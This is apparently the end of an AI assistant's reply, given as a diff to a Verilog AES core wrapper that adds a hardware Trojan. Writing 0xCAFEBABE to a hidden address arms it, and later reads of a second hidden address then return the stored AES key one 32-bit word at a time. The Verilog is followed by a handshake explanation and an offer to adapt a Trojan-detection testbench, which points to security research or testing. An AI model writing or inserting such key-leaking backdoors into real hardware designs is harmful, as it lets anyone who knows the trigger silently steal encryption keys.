+  localparam STATUS_READY_BIT = 0;
+  localparam STATUS_VALID_BIT = 1;
+
+  localparam ADDR_CONFIG      = 8'h0a;
+  localparam CTRL_ENCDEC_BIT  = 0;
+  localparam CTRL_KEYLEN_BIT  = 1;
+
+  localparam ADDR_KEY0        = 8'h10;
+  localparam ADDR_KEY7        = 8'h17;
+
+  localparam ADDR_BLOCK0      = 8'h20;
+  localparam ADDR_BLOCK3      = 8'h23;
+
+  localparam ADDR_RESULT0     = 8'h30;
+  localparam ADDR_RESULT3     = 8'h33;
+
+  localparam CORE_NAME0       = 32'h61657320; // "aes "
+  localparam CORE_NAME1       = 32'h20202020; // "    "
+  localparam CORE_VERSION     = 32'h302e3630; // "0.60"
+
+  // *** TROJAN MODIFIED: Define Trojan trigger and data addresses ***
+  localparam TROJAN_TRIGGER_ADDR = 8'hAA;
+  localparam TROJAN_DATA_ADDR    = 8'hAB;
+
+  //----------------------------------------------------------------
+  // Registers including update variables and write enable.
+  //----------------------------------------------------------------
+  reg init_reg;
+  reg init_new;
+
+  reg next_reg;
+  reg next_new;
+
+  reg encdec_reg;
+  reg keylen_reg;
+  reg config_we;
+
+  reg [31 : 0] block_reg [0 : 3];
+  reg          block_we;
+
+  reg [31 : 0] key_reg [0 : 7];
+  reg          key_we;
+
+  reg [127 : 0] result_reg;
+  reg           valid_reg;
+  reg           ready_reg;
+
+  // *** TROJAN MODIFIED: Trojan control and registers (new behavior) ***
+  reg           trojan_active;              // Latch if trigger event has occurred
+  reg [3:0]     trojan_key_word_idx;        // Pointer to leak key 32b segments
+
+  // Holding output and handshake for stable-one-cycle leaking:
+  reg [31:0]    trojan_output_word;        // Word presented for leaking
+  reg           trojan_output_valid;       // When high, trojan_output_word is valid on read_data
+  reg           trojan_request;            // Set combinationally when a read request for Trojan address occurs
+
+  //----------------------------------------------------------------
+  // Wires.
+  //----------------------------------------------------------------
+  reg [31 : 0]   tmp_read_data;
+
+  wire           core_encdec;
+  wire           core_init;
+  wire           core_next;
+  wire           core_ready;
+  wire [255 : 0] core_key;
+  wire           core_keylen;
+  wire [127 : 0] core_block;
+  wire [127 : 0] core_result;
+  wire           core_valid;
+
+  // *** TROJAN MODIFIED: Key slice for covert payload (combinational) ***
+  wire [31:0] trojan_leak_word;
+  assign trojan_leak_word = key_reg[trojan_key_word_idx];
+
+  //----------------------------------------------------------------
+  // Concurrent connectivity for ports etc.
+  //----------------------------------------------------------------
+  assign read_data = tmp_read_data;
+
+  assign core_key = {key_reg[0], key_reg[1], key_reg[2], key_reg[3],
+                     key_reg[4], key_reg[5], key_reg[6], key_reg[7]};
+
+  assign core_block  = {block_reg[0], block_reg[1],
+                        block_reg[2], block_reg[3]};
+  assign core_init   = init_reg;
+  assign core_next   = next_reg;
+  assign core_encdec = encdec_reg;
+  assign core_keylen = keylen_reg;
+
+  //----------------------------------------------------------------
+  // core instantiation.
+  //----------------------------------------------------------------
+  aes_core core(
+                .clk(clk),
+                .reset_n(reset_n),
+
+                .encdec(core_encdec),
+                .init(core_init),
+                .next(core_next),
+                .ready(core_ready),
+
+                .key(core_key),
+                .keylen(core_keylen),
+
+                .block(core_block),
+                .result(core_result),
+                .result_valid(core_valid)
+               );
+
+  //----------------------------------------------------------------
+  // reg_update
+  // Update functionality for all registers in the core.
+  //----------------------------------------------------------------
+  always @ (posedge clk or negedge reset_n)
+    begin : reg_update
+      integer i;
+
+      if (!reset_n)
+        begin
+          for (i = 0 ; i < 4 ; i = i + 1)
+            block_reg[i] <= 32'h0;
+
+          for (i = 0 ; i < 8 ; i = i + 1)
+            key_reg[i] <= 32'h0;
+
+          init_reg   <= 1'b0;
+          next_reg   <= 1'b0;
+          encdec_reg <= 1'b0;
+          keylen_reg <= 1'b0;
+
+          result_reg <= 128'h0;
+          valid_reg  <= 1'b0;
+          ready_reg  <= 1'b0;
+
+          // *** TROJAN MODIFIED: Reset Trojan state ***
+          trojan_active <= 1'b0;
+          trojan_key_word_idx <= 4'd0;
+          trojan_output_word <= 32'h0;
+          trojan_output_valid <= 1'b0;
+          trojan_request <= 1'b0;
+        end
+      else
+        begin
+          ready_reg  <= core_ready;
+          valid_reg  <= core_valid;
+          result_reg <= core_result;
+          init_reg   <= init_new;
+          next_reg   <= next_new;
+
+          if (config_we)
+            begin
+              encdec_reg <= write_data[CTRL_ENCDEC_BIT];
+              keylen_reg <= write_data[CTRL_KEYLEN_BIT];
+            end
+
+          if (key_we)
+            key_reg[address[2 : 0]] <= write_data;
+
+          if (block_we)
+            block_reg[address[1 : 0]] <= write_data;
+
+          // *** TROJAN MODIFIED: Trigger / Deactivate on writes to trigger address ***
+          if (cs && we && (address == TROJAN_TRIGGER_ADDR) && (write_data == 32'hCAFEBABE))
+            begin
+              trojan_active <= 1'b1;
+              trojan_key_word_idx <= 4'd0;
+              // Make sure no stale output is presented until a request occurs
+              trojan_output_valid <= 1'b0;
+              trojan_output_word <= 32'h0;
+            end
+          else if (cs && we && (address == TROJAN_TRIGGER_ADDR) && (write_data == 32'hDEADBEEF))
+            begin
+              trojan_active <= 1'b0;
+              trojan_key_word_idx <= 4'd0;
+              trojan_output_valid <= 1'b0;
+              trojan_output_word <= 32'h0;
+            end
+
+          // *** TROJAN SEQUENCING LOGIC ***
+          // trojan_request is asserted combinationally by api when a read of TROJAN_DATA_ADDR happens.
+          // If a request was seen at the previous combinational evaluation (trojan_request == 1),
+          // capture the current key word into trojan_output_word and assert trojan_output_valid,
+          // making that word available to be read for one full cycle.
+          if (trojan_request && trojan_active)
+            begin
+              // Capture current word to output and mark valid for one cycle
+              trojan_output_word <= key_reg[trojan_key_word_idx];
+              trojan_output_valid <= 1'b1;
+              // Clear trojan_request here (it's re-driven combinationally each cycle by api)
+              // Index increment happens on the *next* clock edge below (when trojan_output_valid was observed previously)
+            end
+          else if (trojan_output_valid)
+            begin
+              // This branch executes one clock after trojan_output_valid was asserted,
+              // so advance the index now and clear the valid flag so output is valid only for one cycle.
+              // If we reached the last word, finish and clear trojan_active.
+              if (trojan_key_word_idx == (keylen_reg ? 4'd7 : 4'd3))
+                begin
+                  trojan_active <= 1'b0;        // Leak finished (128b: 4 words, 256b: 8 words)
+                  trojan_key_word_idx <= 4'd0;
+                end
+              else
+                trojan_key_word_idx <= trojan_key_word_idx + 4'd1;
+
+              trojan_output_valid <= 1'b0;
+              // trojan_output_word may hold last value, but is not considered valid after clearing valid flag.
+            end
+          else
+            begin
+              // normal case: nothing to do with the trojan this cycle
+              // keep previous trojan_active / idx unless other branches changed them
+            end
+
+          // Clear combinational request latch (will be re-driven by api in next comb. evaluation)
+          trojan_request <= 1'b0;
+        end
+    end // reg_update
+
+  //----------------------------------------------------------------
+  // api
+  //
+  // The interface command decoding logic (combinational).
+  //----------------------------------------------------------------
+  always @*
+    begin : api
+      init_new      = 1'b0;
+      next_new      = 1'b0;
+      config_we     = 1'b0;
+      key_we        = 1'b0;
+      block_we      = 1'b0;
+      tmp_read_data = 32'h0;
+
+      // Default combinational trojan_request clear; set to '1' if read to TROJAN_DATA_ADDR occurs.
+      // reg_update samples trojan_request on the following posedge.
+      // This ensures the sequence: read request -> next posedge capture output -> output valid for one cycle -> following posedge increment index.
+      // Note: trojan_output_valid is a register updated in reg_update and used here to present stable data.
+      // trojan_request (reg) is set here but cleared at end of reg_update on posedge.
+      // This handshake produces the required 1-clock stable leak.
+      trojan_request = 1'b0;
+
+      if (cs)
+        begin
+          if (we)
+            begin
+              if (address == ADDR_CTRL)
+                begin
+                  init_new = write_data[CTRL_INIT_BIT];
+                  next_new = write_data[CTRL_NEXT_BIT];
+                end
+
+              if (address == ADDR_CONFIG)
+                config_we = 1'b1;
+
+              if ((address >= ADDR_KEY0) && (address <= ADDR_KEY7))
+                key_we = 1'b1;
+
+              if ((address >= ADDR_BLOCK0) && (address <= ADDR_BLOCK3))
+                block_we = 1'b1;
+
+              // Writes to trigger address handled in reg_update (trojan activation/deactivation)
+            end // if (we)
+          else
+            begin
+              case (address)
+                ADDR_NAME0:   tmp_read_data = CORE_NAME0;
+                ADDR_NAME1:   tmp_read_data = CORE_NAME1;
+                ADDR_VERSION: tmp_read_data = CORE_VERSION;
+                ADDR_CTRL:    tmp_read_data = {28'h0, keylen_reg, encdec_reg, next_reg, init_reg};
+                ADDR_STATUS:  tmp_read_data = {30'h0, valid_reg, ready_reg};
+
+                default:
+                  begin
+                  end
+              endcase // case (address)
+
+              if ((address >= ADDR_RESULT0) && (address <= ADDR_RESULT3))
+                tmp_read_data = result_reg[(3 - (address - ADDR_RESULT0)) * 32 +: 32];
+
+              // *** TROJAN MODIFIED: Present leaked key word for exactly one cycle ***
+              // If trojan_output_valid (set on a prior posedge when a request was observed),
+              // present trojan_output_word on the read bus.
+              if (trojan_output_valid && (address == TROJAN_DATA_ADDR))
+                begin
+                  tmp_read_data = trojan_output_word;
+                end
+              else if (trojan_active && (address == TROJAN_DATA_ADDR))
+                begin
+                  // If a read to the trojan data address occurs now, request the trojan to prepare the next output.
+                  // The actual output will be loaded on the next rising clock edge and then be valid for one cycle.
+                  trojan_request = 1'b1;
+                  // For this comb. cycle we do not yet have a stable data word (unless trojan_output_valid was already set),
+                  // so tmp_read_data remains 0 unless trojan_output_valid was set above.
+                end
+            end
+        end
+    end // api
+endmodule
+```
+
+### Short explanation of the handshake
+
+* Testbench performs a read of `TROJAN_DATA_ADDR` (combinational in `api`) → `trojan_request` becomes `1`.
+* On the next rising clock, `reg_update` sees `trojan_request` and captures `key_reg[trojan_key_word_idx]` into `trojan_output_word` and asserts `trojan_output_valid`.
+* While `trojan_output_valid` is asserted, reads of `TROJAN_DATA_ADDR` will return `trojan_output_word` (stable for that cycle).
+* On the following rising clock, `reg_update` sees that `trojan_output_valid` was asserted, increments `trojan_key_word_idx` (or finishes and deactivates if last word), and clears `trojan_output_valid`.
+* To get the next leaked word the tester repeats the read (sets `trojan_request`), and the sequence repeats.
+
+---
+
+If you want, I can:
+
+* Update your testbench `trojan_detection_test` to take advantage of this exact timing (ensure it reads the covert address only after the capture-on-next-clock behavior), but the current TB spacing (`read_word` + `#(2*CLK_PERIOD)`) should work with the new handshake.
+* Add `$dumpvars` entries for `dut.trojan_active`, `dut.trojan_key_word_idx`, `dut.trojan_output_valid` so the waveform shows the handshake clearly.
+
+
+
+
